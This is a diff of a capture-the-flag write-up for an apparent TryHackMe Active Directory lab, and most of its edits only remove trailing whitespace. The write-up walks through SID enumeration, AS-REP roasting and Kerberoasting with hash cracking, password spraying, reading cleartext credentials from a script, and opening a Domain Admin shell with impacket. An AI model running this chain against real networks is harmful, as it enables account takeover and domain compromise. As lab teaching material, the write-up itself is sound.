@@ -65,9 +65,9 @@ Nmap done: 1 IP address (1 host up) scanned in 103.27 seconds
 So, we have all the Active Directory services available. Let's add the findings in our hosts file.
 
 ```bash
-kali@kali:cat /etc/hosts                                                                                                                                 
+kali@kali:cat /etc/hosts
 10.48.190.241   ad.thm.local thm.local thm-LABYRINTH-CA
- 
+
 127.0.0.1       localhost
 127.0.1.1       kali.kali       kali
 
@@ -80,7 +80,7 @@ ff02::2 ip6-allrouterso
 That been done. Let's start by checking if we have guest logon allowed.
 
 ```bash
-kali@kali:smbclient -L //10.48.190.241                                                                                                                   
+kali@kali:smbclient -L //10.48.190.241
 Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
@@ -88,8 +88,8 @@ Password for [WORKGROUP\kali]:
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
         IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.48.190.241 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
@@ -98,8 +98,8 @@ Unable to connect with SMB1 -- no workgroup available
 So, we have guest logon allowed, we can use this to get the usernames.
 
 ```bash
-kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass                                                                                                
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Brute forcing SIDs at 10.48.190.241
 [*] StringBinding ncacn_np:10.48.190.241[\pipe\lsarpc]
@@ -121,7 +121,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 That is a very long list, let's pipe thae usernames in wordlist.
 
 ```bash
-kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt                  
+kali@kali:impacket-lookupsid guest@10.48.190.241 -no-pass | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
 
 kali@kali:head users.txt
 Administrator
@@ -142,8 +142,8 @@ VAUGHN_MARTIN
 We have the usernames, let's see if any users are AS-REP Roastable.
 
 ```bash
-kali@kali:impacket-GetNPUsers THM/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.190.241                                
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-GetNPUsers THM/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.48.190.241
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -162,7 +162,7 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 We got 5 AS-REP hashes, let's crack them using John the ripper.
 
 ```bash
-kali@kali:cat asrep_hashes.txt                                                                                                                           
+kali@kali:cat asrep_hashes.txt
 $krb5asrep$23$SHELLEY_BEARD@THM:8c46.....9e78a9
 $krb5asrep$23$ISIAH_WALKER@THM:df360.....d56f3
 $krb5asrep$23$QUEEN_GARNER@THM:05b5c2.....a937
@@ -248,18 +248,19 @@ C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362
 Directory of C:\
-05/16/2023  11:00 AM    <DIR>          Data 
-11/14/2018  06:56 AM    <DIR>          EFI                                                                             
-05/12/2023  07:34 AM    <DIR>          inetpub                                                                         
-05/13/2020  05:58 PM    <DIR>          PerfLogs                                                                        
-07/05/2023  12:06 PM    <DIR>          Program Files                                                                   
-03/11/2021  07:29 AM    <DIR>          Program Files (x86)                                                             
-05/13/2024  07:23 PM    <DIR>          Scripts                                                                         
-03/03/2026  03:56 AM    <DIR>          Users                                                                           
-04/16/2024  09:56 PM    <DIR>          Windows                                                                                        
-0 File(s)              0 bytes                                                                                          
-9 Dir(s)  12,482,605,056 bytes free                                                                                                                                                                                             
-C:\>cd Scripts                                                                                                         
+05/16/2023  11:00 AM    <DIR>          Data
+11/14/2018  06:56 AM    <DIR>          EFI
+05/12/2023  07:34 AM    <DIR>          inetpub
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+07/05/2023  12:06 PM    <DIR>          Program Files
+03/11/2021  07:29 AM    <DIR>          Program Files (x86)
+05/13/2024  07:23 PM    <DIR>          Scripts
+03/03/2026  03:56 AM    <DIR>          Users
+04/16/2024  09:56 PM    <DIR>          Windows
+0 File(s)              0 bytes
+9 Dir(s)  12,482,605,056 bytes free
+
+C:\>cd Scripts
 Access is denied.
 ```
 
@@ -268,28 +269,30 @@ We find a scripts directory, but it is currently not accessible by cody_roy.
 Let's try a password spraying, hoping we can get some user with same password.
 
 ```bash
-kali@kali:nxc smb ad.thm.local -u users.txt -p 'MK..o0' --continue-on-success                                                                             
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
-SMB         10.48.190.241   445    AD               [-] thm.local\Administrator:MK..o0 STATUS_LOGON_FAILURE 
-SMB         10.48.190.241   445    AD               [-] thm.local\Guest:MK..o0 STATUS_LOGON_FAILURE 
-SMB         10.48.190.241   445    AD               [-] thm.local\krbtgt:MK..o0 STATUS_LOGON_FAILURE 
+kali@kali:nxc smb ad.thm.local -u users.txt -p 'MK..o0' --continue-on-success
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
+Auth:True)
+SMB         10.48.190.241   445    AD               [-] thm.local\Administrator:MK..o0 STATUS_LOGON_FAILURE
+SMB         10.48.190.241   445    AD               [-] thm.local\Guest:MK..o0 STATUS_LOGON_FAILURE
+SMB         10.48.190.241   445    AD               [-] thm.local\krbtgt:MK..o0 STATUS_LOGON_FAILURE
 SMB         10.48.190.241   445    AD               [-] thm.local\AD$:MK..o0 STATUS_LOGON_FAILURE
 .
 .
 .
 .
-SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK..o0 
-SMB         10.48.190.241   445    AD               [-] thm.local\MERLIN_HARPER:MK..o0 STATUS_LOGON_FAILURE 
-SMB         10.48.190.241   445    AD               [-] thm.local\SALVATORE_DODSON:MK..o0 STATUS_LOGON_FAILURE 
-SMB         10.48.190.241   445    AD               [-] thm.local\KRISTINE_RIDDLE:MK..o0 STATUS_LOGON_FAILURE 
+SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK..o0
+SMB         10.48.190.241   445    AD               [-] thm.local\MERLIN_HARPER:MK..o0 STATUS_LOGON_FAILURE
+SMB         10.48.190.241   445    AD               [-] thm.local\SALVATORE_DODSON:MK..o0 STATUS_LOGON_FAILURE
+SMB         10.48.190.241   445    AD               [-] thm.local\KRISTINE_RIDDLE:MK..o0 STATUS_LOGON_FAILURE
 SMB         10.48.190.241   445    AD               [-] thm.local\BRAD_HOWE:MK..o0 STATUS_LOGON_FAILURE
 ```
 
 That was a success, user ZACHARY_HUNT also has the same password.
 
 ```bash
-kali@kali:nxc smb 10.48.190.241 -u ZACHARY_HUNT -p 'MK...o0'                                                                                                   
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
+kali@kali:nxc smb 10.48.190.241 -u ZACHARY_HUNT -p 'MK...o0'
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
+Auth:True)
 SMB         10.48.190.241   445    AD               [+] thm.local\ZACHARY_HUNT:MK...o0
 ```
 
@@ -313,18 +316,18 @@ We got the kerberos hash, let's crack it.
 kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
-Will run 4 OpenMP threads                                                                                                                                 
-Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                             
-lo...fe!       (?)                                                                                                                                      
-1g 0:00:00:00 DONE (2026-03-03 09:38) 2.777g/s 1737Kp/s 1737Kc/s 1737KC/s lrcjks..love2cook                                                               
-Use the "--show" option to display all of the cracked passwords reliably                                                                                  
-Session completed. 
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+lo...fe!       (?)
+1g 0:00:00:00 DONE (2026-03-03 09:38) 2.777g/s 1737Kp/s 1737Kc/s 1737KC/s lrcjks..love2cook
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 ```
 
 That was successful. 
 
 ```bash
-kali@kali:nxc rdp 10.48.190.241 -u JERRI_LANCASTER -p 'lo...fe!'                                                                                              
+kali@kali:nxc rdp 10.48.190.241 -u JERRI_LANCASTER -p 'lo...fe!'
 RDP         10.48.190.241   3389   AD               [*] Windows 10 or Windows Server 2016 Build 17763 (name:AD) (domain:thm.local) (nla:True)
 RDP         10.48.190.241   3389   AD               [+] thm.local\JERRI_LANCASTER:lo...fe! (Pwn3d!)
 ```
@@ -338,13 +341,15 @@ kali@kali:xfreerdp3 /u:JERRI_LANCASTER /p:'lo...fe!' /v:10.48.190.241 /d:thm.loc
 [09:45:19:672] [14948:00003a64] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
 ```
 ```bash
-C:\Scripts>dir                                                                                                          
-Volume in drive C has no label.                                                                                        
-Volume Serial Number is A8A4-C362                                                                                                                                                                                                              
-Directory of C:\Scripts                                                                                                                                                                                                                       
-05/13/2024  07:23 PM    <DIR>          .                                                                               
-05/13/2024  07:23 PM    <DIR>          ..                                                                              
-05/13/2024  06:50 PM               426 syncer.ps1                                                                                     
+C:\Scripts>dir
+Volume in drive C has no label.
+Volume Serial Number is A8A4-C362
+
+Directory of C:\Scripts
+
+05/13/2024  07:23 PM    <DIR>          .
+05/13/2024  07:23 PM    <DIR>          ..
+05/13/2024  06:50 PM               426 syncer.ps1
 1 File(s)            426 bytes                                                                                          2
 Dir(s)  12,435,197,952 bytes free
 ```
@@ -352,22 +357,25 @@ Dir(s)  12,435,197,952 bytes free
 We can access the directory and we have a powershell script here.
 
 ```bash
-C:\Scripts>type syncer.ps1                                                                                             
-#Import Active Directory module                                                                                     
-Import-Module ActiveDirectory                                                                                                                                                                                                                  
-# Define credentials                                                                                                   
-$Username = "SANFORD_DAUGHERTY"                                                                                        
-$Password = ConvertTo-SecureString "RE...23" -AsPlainText -Force                                                 
-$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)                                                                                                                                                       
-# Sync Active Directory                                                                                                
+C:\Scripts>type syncer.ps1
+#Import Active Directory module
+Import-Module ActiveDirectory
+
+# Define credentials
+$Username = "SANFORD_DAUGHERTY"
+$Password = ConvertTo-SecureString "RE...23" -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)
+
+# Sync Active Directory
 Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
 ```
 
 Yay !!! We have a cleartext credentials for user sanford_daugherty. 
 
 ```bash
-kali@kali:nxc smb 10.48.190.241 -u SANFORD_DAUGHERTY -p 'RE...23'                             
-SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                          
+kali@kali:nxc smb 10.48.190.241 -u SANFORD_DAUGHERTY -p 'RE...23'
+SMB         10.48.190.241   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null
+Auth:True)
 SMB         10.48.190.241   445    AD               [+] thm.local\SANFORD_DAUGHERTY:RE...123 (Pwn3d!)
 ```
 
@@ -376,8 +384,8 @@ SMB         10.48.190.241   445    AD               [+] thm.local\SANFORD_DAUGHE
 We are in Domain Admin's group, let's use impacket-smbexec to login to machine.
 
 ```bash
-kali@kali:impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RE...23@ad.thm.local'                                                                             
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+kali@kali:impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:RE...23@ad.thm.local'
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [!] Launching semi-interactive shell - Careful what you execute
 C:\Windows\system32>whoami
